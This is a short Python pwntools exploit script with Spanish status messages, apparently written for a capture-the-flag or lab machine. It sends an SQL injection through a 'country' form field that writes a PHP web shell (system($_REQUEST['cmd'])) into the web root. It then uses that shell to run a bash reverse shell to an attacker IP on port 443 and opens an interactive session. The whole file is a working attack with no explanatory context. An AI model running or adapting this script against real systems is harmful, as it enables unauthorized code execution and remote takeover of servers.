
#!/usr/bin/python3

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 2:
	log.failure("Uso: %s <ip-address>" % sys.argv[0])
	sys.exit(1)

# Variables globales
filename = "pwn.php"
ip_address = sys.argv[1]
main_url = "http://%s/" % ip_address
lport = 443
lip_address = "10.10.10.10"

def createFile():

	data_post = {
		'username': 'pwn',
		'country': """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/%s"-- -""" % (filename)
	}

	r = requests.post(main_url, data=data_post)

def getAccess():

	data_post = {
		'cmd': "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (lip_address, lport)
	}

	r = requests.post(main_url + "%s" % filename, data=data_post)

if __name__ == '__main__':

	createFile()
	try:
		threading.Thread(target=getAccess, args=()).start()
	except Exception as e:
		log.error(str(e))

	shell = listen(lport, timeout=20).wait_for_connection()
	shell.interactive()
